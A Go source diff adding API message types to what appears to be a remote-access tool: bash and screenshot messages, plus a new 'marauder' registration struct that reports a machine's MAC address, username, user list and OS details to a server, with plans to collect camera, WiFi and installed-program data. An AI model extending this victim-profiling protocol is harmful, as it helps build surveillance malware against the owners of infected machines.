@@ -1,5 +1,9 @@
 package internal
 
+// ==========================================================================================
+// CLIENT SIDE API
+// ==========================================================================================
+
 // ==================================================
 // All requests must have this
 // ==================================================
@@ -41,6 +45,8 @@ type ScreenRequest struct {
 }
 
 // ==========================================================================================
+// SERVER SIDE API
+// ==========================================================================================
 
 // ==================================================
 // All responses must have this
@@ -65,4 +71,24 @@ type BashResponse struct {
 type ScreenshotNotification struct {
 	ResponseHeaders
 	Filename string `json:"filename"`
+}
+
+// Sends marauder data for registration to the server
+// @action: marauder action
+// @devicetype: marauder device type - desktop|mobile ~ (Always desktop in this program)
+// @machinename: marauder machine name
+// @username: marauder username
+// @os: marauder operating system
+// @machineusers: list of users in the machine
+// @installationdate: date of the installation of the OS YYYY-MM-DD
+// TODO: add devices info (cameras, keyboards, mouses, number of screens, harddrives, WiFi info, programs installed)
+type MarauderRegistrationRequest struct {
+	Action             string   `json:"action"`
+	Macaddress         string   `json:"macaddress"`
+	Devicetype         string   `json:"devicetype"`
+	Devicename         string   `json:"devicename"`
+	Username           string   `json:"username"`
+	Os                 string   `json:"os"`
+	Machineusers       []string `json:"machineusers"`
+	OsInstallationdate string   `json:"osinstallationdate"`
 }
